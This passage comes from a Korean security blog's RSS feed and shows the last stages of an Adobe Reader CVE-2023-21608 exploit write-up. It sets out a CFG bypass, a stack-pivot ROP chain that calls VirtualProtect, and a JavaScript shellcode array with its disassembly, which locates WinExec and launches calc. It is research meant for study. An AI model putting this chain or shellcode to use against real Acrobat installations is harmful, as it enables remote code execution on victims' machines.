&#xD638;&#xCD9C;&#xC5D0; &#xC2E4;&#xD328;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; <code>sub_20EFAA60</code>&#xB294; &#xC544;&#xB798;&#xC758; <code>AXTEFontAccess::</code>vftable&#x2019;<code>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xAC04;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218;&#xC774;&#xACE0; &#xC720;&#xD6A8;&#xD55C; &#xD568;&#xC218;&#xB4E4;&#xC758; RVA &#xC8FC;&#xC18C;&#xAC00; &#xC800;&#xC7A5;&#xB41C;</code>__guard_fids_table`&#xC5D0;&#xB3C4; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs nasm">.rdata:211315C0 ; const AXTEFontAccess::`vftable&apos;.rdata:211315C0 ??_7AXTEFontAccess@@6B@ dd offset sub_20DFFBE0.rdata:211315C0                                         ; DATA XREF: sub_20DFF7B6+21&#x2191;o.rdata:211315C0                                         ; sub_20DFFAAA+6&#x2191;o                                       .....rdata:21131674                 dd offset sub_20EFAA60                                       ....</code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>ntdll!LdrpValidateUserCallTarget</code>&#xC758; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD558;&#xACE0; &#xD638;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p><pre><code class="hljs routeros"><span class="hljs-attribute">eax</span>=20000158 <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=63eeaa60 <span class="hljs-attribute">edx</span>=0be950e0 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990<span class="hljs-attribute">eip</span>=63a89a3b <span class="hljs-attribute">esp</span>=0457c170 <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl nz na po nc<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200202AcroForm!hb_ot_tags_to_script_and_language+0x68f9b:63a89a3b ff153ca9fc63    call    dword ptr [AcroForm!DllUnregisterServer+0x50e8dc (63fca93c)] ds:002b:63fca93c={ntdll!LdrpValidateUserCallTarget (777c88e0)}0:000&gt; p<span class="hljs-attribute">eax</span>=0c7dd54c <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=63eeaa60 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990<span class="hljs-attribute">eip</span>=63a89a41 <span class="hljs-attribute">esp</span>=0457c170 <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl zr na pe cy<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200247AcroForm!hb_ot_tags_to_script_and_language+0x68fa1:63a89a41 8b4dec          mov     ecx,dword ptr [ebp-14h] ss:002b:<span class="hljs-attribute">0457c188</span>=10c7d0380:000&gt; p<span class="hljs-attribute">eax</span>=0c7dd54c <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=10c7d038 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990<span class="hljs-attribute">eip</span>=63a89a44 <span class="hljs-attribute">esp</span>=0457c170 <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl zr na pe cy<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200247AcroForm!hb_ot_tags_to_script_and_language+0x68fa4:63a89a44 ffd6            call    esi {AcroForm!DllUnregisterServer+0x42ea00 (63eeaa60)}</code></pre><p>&#xC774;&#xD6C4; &#xD638;&#xCD9C;&#xB41C; <code>sub_20EFAA60</code>&#xC5D0;&#xC11C; <code>mov eax, [ecx]</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; ecx(<code>this</code>)&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; Fake vtable&#xC758; &#xC8FC;&#xC18C;(0x20000158)&#xAC00; eax&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>call dword ptr [eax + 30h]</code>&#xC5D0; &#xC758;&#xD574; Fake vtable + 0x30&#xC5D0; &#xC800;&#xC7A5;&#xB41C; stack pivot &#xAC00;&#xC82F;&#xC774; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. <code>sub_20EFAA60</code>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xC5D0;&#xC11C;&#xB294; CFG &#xAC80;&#xC0AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; ROP &#xAC00;&#xC82F;&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; CFG&#xB97C; &#xC6B0;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs routeros"><span class="hljs-attribute">eax</span>=0c7dd54c <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=10c7d038 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990<span class="hljs-attribute">eip</span>=63eeaa60 <span class="hljs-attribute">esp</span>=0457c16c <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl zr na pe cy<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200247AcroForm!DllUnregisterServer+0x42ea00:63eeaa60 8b01            mov     eax,dword ptr [ecx]  ds:002b:<span class="hljs-attribute">10c7d038</span>=200001580:000&gt; t<span class="hljs-attribute">eax</span>=20000158 <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=10c7d038 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990<span class="hljs-attribute">eip</span>=63eeaa62 <span class="hljs-attribute">esp</span>=0457c16c <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl zr na pe cy<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200247AcroForm!DllUnregisterServer+0x42ea02:63eeaa62 6a0d            push    0Dh0:000&gt; t<span class="hljs-attribute">eax</span>=20000158 <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=10c7d038 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990<span class="hljs-attribute">eip</span>=63eeaa64 <span class="hljs-attribute">esp</span>=0457c168 <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl zr na pe cy<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200247AcroForm!DllUnregisterServer+0x42ea04:63eeaa64 ff5030          call    dword ptr [eax+30h]  ds:002b:<span class="hljs-attribute">20000188</span>=63a469840:000&gt; u 63a46984AcroForm!hb_ot_tags_to_script_and_language+0x25ee4:63a46984 8be0            mov     esp,eax63a46986 ffc9            dec     ecx63a46988 c3              ret</code></pre><p>&#xAC00;&#xC82F;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74; eax(<code>arrBufPtr + 0x100</code>)&#xAC12;&#xC744; esp&#xC5D0; &#xC4F0;&#xBA74;&#xC11C; stack pivot&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xACE0; <code>ret</code>&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370; &#xC774;&#xB54C;&#xC758; esp&#xC778; 0x20000158&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC758; &#xB610; &#xB2E4;&#xB978; stack pivot &#xAC00;&#xC82F;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs routeros"><span class="hljs-attribute">eax</span>=20000158 <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=10c7d037 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990<span class="hljs-attribute">eip</span>=6380e646 <span class="hljs-attribute">esp</span>=2000015c <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl nz na po cy<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200203AcroForm+0x1e646:6380e646 5c              pop     esp0:000&gt; t<span class="hljs-attribute">eax</span>=20000158 <span class="hljs-attribute">ebx</span>=00000001 <span class="hljs-attribute">ecx</span>=10c7d037 <span class="hljs-attribute">edx</span>=00005000 <span class="hljs-attribute">esi</span>=63eeaa60 <span class="hljs-attribute">edi</span>=63a89990<span class="hljs-attribute">eip</span>=6380e647 <span class="hljs-attribute">esp</span>=20000358 <span class="hljs-attribute">ebp</span>=0457c19c <span class="hljs-attribute">iopl</span>=0         nv up ei pl nz na po cy<span class="hljs-attribute">cs</span>=0023  <span class="hljs-attribute">ss</span>=002b  <span class="hljs-attribute">ds</span>=002b  <span class="hljs-attribute">es</span>=002b  <span class="hljs-attribute">fs</span>=0053  <span class="hljs-attribute">gs</span>=002b             <span class="hljs-attribute">efl</span>=00200203AcroForm+0x1e647:6380e647 c3              ret0:000&gt; dd esp20000358  757d0760 20000458 20000458 0000100020000368  00000040 20000598 00000000 00000000</code></pre><p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; esp&#xB294; 0x20000358&#xB85C; &#xBC14;&#xB00C;&#xAC8C; &#xB418;&#xACE0; &#xD55C;&#xBC88; &#xB354; <code>ret</code>&#xD558;&#xBA74;&#xC11C; <code>KERNEL32!VirtualProtectStub</code> &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB85C; eip&#xAC00; &#xBCC0;&#xACBD;&#xB418;&#xACE0; pivot&#xB41C; &#xC2A4;&#xD0DD;&#xC5D0; &#xAD6C;&#xC131;&#xB41C; &#xC778;&#xC790;&#xB4E4;&#xC5D0; &#xC758;&#xD574; <code>VirtualProtect(0x20000458, 0x1000, PAGE_EXECUTE_READWRITE, 0x20000598)</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xAC19;&#xC740; &#xD6A8;&#xACFC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="6-Insert-Shellcode"><a href="#6-Insert-Shellcode" class="headerlink" title="6. Insert Shellcode"></a>6. Insert Shellcode</h2><p>&#xC0BD;&#xC785;&#xB41C; ROP &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0; &#xC758;&#xD574; &#xD638;&#xCD9C;&#xB41C; <code>VirtualProtect</code>&#xB294; &#xC2E4;&#xD589; &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB41C; 0x20000458&#xB85C; &#xB9AC;&#xD134;&#xD558;&#xACE0; &#xC774; &#xC8FC;&#xC18C;&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xC5D0; &#xC758;&#xD574; shellcode&#xAC00; &#xC0BD;&#xC785;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-keyword">var</span> shellcode = [    <span class="hljs-comment">// recovery prefix       (store reg context)</span>    <span class="hljs-comment">// 0x909090CC,</span>    <span class="hljs-number">0x89e083e8</span>, <span class="hljs-number">0x18535256</span>, <span class="hljs-number">0x57505590</span>,    <span class="hljs-comment">// shellcode</span>    <span class="hljs-number">835867240</span>, <span class="hljs-number">1667329123</span>, <span class="hljs-number">1415139921</span>, <span class="hljs-number">1686860336</span>, <span class="hljs-number">2339769483</span>, <span class="hljs-number">1980542347</span>, <span class="hljs-number">814448152</span>, <span class="hljs-number">2338274443</span>,    <span class="hljs-number">1545566347</span>, <span class="hljs-number">1948196865</span>, <span class="hljs-number">4270543903</span>, <span class="hljs-number">605009708</span>, <span class="hljs-number">390218413</span>, <span class="hljs-number">2168194903</span>, <span class="hljs-number">1768834421</span>, <span class="hljs-number">4035671071</span>,    <span class="hljs-number">469892611</span>, <span class="hljs-number">1018101719</span>, <span class="hljs-number">2425393296</span>,    <span class="hljs-comment">// recovery suffix</span>    <span class="hljs-comment">// 0x909090CC,</span>    <span class="hljs-comment">/*restore regs*/</span> <span class="hljs-number">0x58585d58</span>, <span class="hljs-comment">/*restore vtable*/</span> <span class="hljs-number">0x8b48608b</span>, <span class="hljs-number">0x50648911</span>, <span class="hljs-comment">/*pop regs*/</span> <span class="hljs-number">0x5f5e5a5b</span>,    <span class="hljs-comment">/*restore ebp,esp: 0x89ea83ea, 0x3089d490, */</span> <span class="hljs-number">0x89ec83ec</span>, <span class="hljs-number">0x30909090</span>, <span class="hljs-comment">/* esi = fn*/</span> <span class="hljs-number">0x8b706890</span>,    <span class="hljs-comment">/*arrbuf restore*/</span> <span class="hljs-number">0x53bb4000</span>, <span class="hljs-number">0x00208b50</span>, <span class="hljs-number">0x6cc7430c</span>, <span class="hljs-number">0xe8ff0000</span>, <span class="hljs-number">0xc74220e8</span>, <span class="hljs-number">0xff000090</span>,    <span class="hljs-number">0x8953108b</span>, <span class="hljs-number">0x50708913</span>, <span class="hljs-number">0x8b507489</span>, <span class="hljs-number">0x530431d2</span>, <span class="hljs-number">0x5b909090</span>, <span class="hljs-comment">/*jmp esi*/</span> <span class="hljs-number">0xffe69090</span>    <span class="hljs-comment">/*jmp defaultVal 0xff606890*/</span>];<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.length; i++) AAW(arrBufPtr + <span class="hljs-number">0x400</span> + i * <span class="hljs-number">4</span>, re(shellcode[i]));</code></pre><p>&#xC0BD;&#xC785;&#xB41C; shellcode&#xB97C; &#xB514;&#xC2A4;&#xC5B4;&#xC148;&#xBE14;&#xD55C; &#xACB0;&#xACFC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;</p><pre><code class="hljs nasm">89e0           mov     eax, esp83e818         sub     eax, 18h53             push    ebx52             push    edx56             push    esi57             push    edi50             push    eax55             push    ebp90             nop     31d2           xor     edx, edx52             push    edx; 06863616c63     push    636C6163h; &quot;calc&quot;54             push    esp59             pop     ecx52             push    edx51             push    ecx648b7230       mov     esi, dword ptr fs:[edx+30h]; PEB8b760c         mov     esi, dword ptr [esi+0Ch]; PEB_LDR_DATA8b760c         mov     esi, dword ptr [esi+0Ch]; InLoadOrderModuleListad             lods    dword ptr [esi]; eax &lt;- AcroRd32.exe&apos;s _LDR_DATA_TABLE_ENTRY8b30           mov     esi, dword ptr [eax]; esi &lt;- KERNEL32.dll&apos;s _LDR_DATA_TABLE_ENTRY8b7e18         mov     edi, dword ptr [esi+18h]; edi &lt;- KERNEL32 dll base8b5f3c         mov     ebx, dword ptr [edi+3Ch]; ebx &lt;- PE Headaer Offset8b5c1f78       mov     ebx, dword ptr [edi+ebx+78h]; ebx &lt;- Export Table Offset8b741f20       mov     esi, dword ptr [edi+ebx+20h]; esi &lt;- Name Pointer Table offset01fe           add     esi, edi; add KERNEL32 base to esi(Name Pointer Table addr)8b541f24       mov     edx, dword ptr [edi+ebx+24h]; edx &lt;- Ordinal Table Offset0fb72c17       movzx   ebp, word ptr [edi+edx]; ebp &lt;- Ordinal Number42             inc     edx42             inc     edx; move to nextad             lods    dword ptr [esi]; Function name offset813c0757696e45 cmp     dword ptr [edi+eax], 456E6957h; compare Function_Name with &quot;WinE&quot;75f0           jne     20000491; if WinExec Found, no jump8b741f1c       mov     esi, dword ptr [edi+ebx+1Ch]; esi &lt;- Address Table Offset01fe           add     esi, edi; esi &lt;- Address Table addr033cae         add     edi, dword ptr [esi+ebp*4]; edi &lt;- edi(KERNEL32 base) + WinExec Offsetffd7           call    edi; WinExec(&quot;calc&quot;, 0)</code></pre><p>&#xC774;&#xB294; <code>WinExec(&quot;calc&quot;, 0)</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; Windows x86 &#xB300;&#xC0C1; Universal Shellcode&#xB85C; &#xACC4;&#xC0B0;&#xAE30; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xC5EC; RCE &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC99D;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; <code>WinExec</code>&#xAC00; &#xB9AC;&#xD134;&#xD55C; &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; shellcode&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; shellcode&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xBCF5;&#xAD6C;&#xD558;&#xACE0; &#xBCC0;&#xC870;&#xB41C; <code>ArrayBuffer</code>&#xC758; length, <code>f0</code>&#xC758; vtable &#xC8FC;&#xC18C;,  pivot&#xB41C; &#xC2A4;&#xD0DD; &#xB4F1;&#xC744; &#xBCF5;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xC0AC;&#xC804;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xD574;&#xB454; <code>defaultValue</code> &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB85C; <code>jmp</code>&#xD558;&#xC5EC; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xC131;&#xACF5;&#xD55C; &#xD6C4;&#xC5D0;&#xB3C4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs nasm">200004b0 58             pop     eax200004b1 58             pop     eax200004b2 5d             pop     ebp200004b3 58             pop     eax200004b4 8b4860         mov     ecx, dword ptr [eax+60h]200004b7 8b5064         mov     edx, dword ptr [eax+64h]200004ba 8911           mov     dword ptr [ecx], edx200004bc 5f             pop     edi200004bd 5e             pop     esi200004be 5a             pop     edx200004bf 5b             pop     ebx200004c0 89ec           mov     esp, ebp200004c2 83ec30         sub     esp, 30h200004c5 90             nop     200004c6 90             nop     200004c7 90             nop     200004c8 8b7068         mov     esi, dword ptr [eax+68h]200004cb 90             nop     200004cc 53             push    ebx200004cd bb40000020     mov     ebx, 20000040h200004d2 8b506c         mov     edx, dword ptr [eax+6Ch]200004d5 c7430ce8ff0000 mov     dword ptr [ebx+0Ch], 0FFE8h200004dc c74220e8ff0000 mov     dword ptr [edx+20h], 0FFE8h200004e3 90             nop     200004e4 895310         mov     dword ptr [ebx+10h], edx200004e7 8b5070         mov     edx, dword ptr [eax+70h]200004ea 8913           mov     dword ptr [ebx], edx200004ec 8b5074         mov     edx, dword ptr [eax+74h]200004ef 895304         mov     dword ptr [ebx+4], edx200004f2 31d2           xor     edx, edx200004f4 5b             pop     ebx200004f5 90             nop     200004f6 90             nop     200004f7 90             nop     200004f8 ffe6           jmp     esi</code></pre><p>ROP &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC640; Shellcode&#xC758; &#xC2E4;&#xD589;&#xC740; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; <code>f0</code>&#xC758; Fake vtable&#xC758; <code>defaultValue</code>&#xD568;&#xC218;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; <code>sub_20EFAA60</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xD06C;&#xB798;&#xC2DC; &#xB4F1; &#xC758;&#xB3C4;&#xCE58; &#xC54A;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBCC0;&#xC870;&#xD55C; <code>targetStr</code>&#xACFC; <code>targetDV</code>&#xB97C; &#xC6D0;&#xB798;&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xBCF5;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">corruptedTypedArr[arrStart + <span class="hljs-number">6</span>] = originalTargetStrAddr;<span class="hljs-comment">//corruptedTypedArr[FAKE_DV_START+20] = originalDVBackingStore;</span>corruptedTypedArr[arrStart + <span class="hljs-number">8</span>] = originalTargetDVAddr;<span class="hljs-keyword">var</span> x = f0.defaultValue;</code></pre><p>&#xC804;&#xCCB4; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xB294; <a href="https://github.com/hacksysteam/CVE-2023-21608">Reference</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xACE0; <code>exploit.pdf</code>&#xC5D0;&#xB294; &#xD574;&#xB2F9; JavaScript &#xCF54;&#xB4DC;&#xAC00; &#xC784;&#xBCA0;&#xB4DC;&#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; Acrobat&#xC774;&#xB098; Acrobat Reader&#xB85C; &#xC5F4; &#xACBD;&#xC6B0; &#xC704; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; RCE&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xB4DC;&#xB514;&#xC5B4;!&#x2026; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xB05D;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; &#xC815;&#xB9D0; &#xC27D;&#xC9C0; &#xC54A;&#xB124;&#xC694;&#x2026; &#xC2DC;&#xC5F0; &#xB370;&#xBAA8;&#xAE4C;&#xC9C0;&#xB9CC; &#xBCF4;&#xC5EC;&#xB4DC;&#xB9AC;&#xACE0; &#xB9C8;&#xCE58;&#xB3C4;&#xB85D;&#xD558;&#xC8E0;!</p><iframe width="560" height="315" src="https://www.youtube.com/embed/f3RObd6h2qw?si=l7WAeyWgGJ_MuCWp" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h1 id="Fini"><a href="#Fini" class="headerlink" title="Fini"></a>Fini</h1><p>&#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCC98;&#xC74C;&#xC774;&#xC5C8;&#xB294;&#xB370; &#xC815;&#xB9D0; &#xC27D;&#xC9C0; &#xC54A;&#xB124;&#xC694;&#x2026; &#xC774;&#xB7F0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB9C8;&#xAD6C; &#xCC3E;&#xB294; &#xC0AC;&#xB78C;&#xB4E4;&#xC740; &#xB300;&#xCCB4; &#xBB50;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xB4E4;&#xC77C;&#xAE4C; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xCC38;&#xACE0;&#xD560;&#xB9CC;&#xD55C; &#xC88B;&#xC740; &#xB808;&#xD37C;&#xB7F0;&#xC2A4;&#xAC00; &#xC788;&#xC5B4;&#xC11C; &#xC27D;&#xAC8C;?&#x2026; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB294;&#xB370; &#xD328;&#xCE58; &#xBD84;&#xC11D; &#xB0B4;&#xC6A9;&#xC740; &#xC5C6;&#xC5B4;&#xC11C; &#xC9C1;&#xC811; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74;&#xC11C; &#xC7AC;&#xBC0C;&#xAE30;&#xB3C4; &#xD588;&#xACE0;&#xC694; &#xC2DC;&#xAC04;&#xB9CC; &#xC788;&#xB2E4;&#xBA74; &#xC55E;&#xC73C;&#xB85C;&#xB3C4; &#xC774;&#xB7F0; &#xAE00; &#xB9CE;&#xC774; &#xC368;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608">https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608</a></li><li><a href="https://github.com/hacksysteam/CVE-2023-21608">https://github.com/hacksysteam/CVE-2023-21608</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/Adobe/">Adobe</category>
      
      <category domain="https://hackyboiz.github.io/tags/UAF/">UAF</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/04/pwndorei/1day1document_CVE-2023-21608/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-21778: Realtek rtl819x Jungle SDK에서 발생한 Heap-based buffer overflow 취약점</title>
      <link>https://hackyboiz.github.io/2024/07/31/pwndorei/2024-07-31/</link>
      <guid>https://hackyboiz.github.io/2024/07/31/pwndorei/2024-07-31/</guid>
      <pubDate>Wed, 31 Jul 2024 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports/TALOS</description>
        
      
      
      
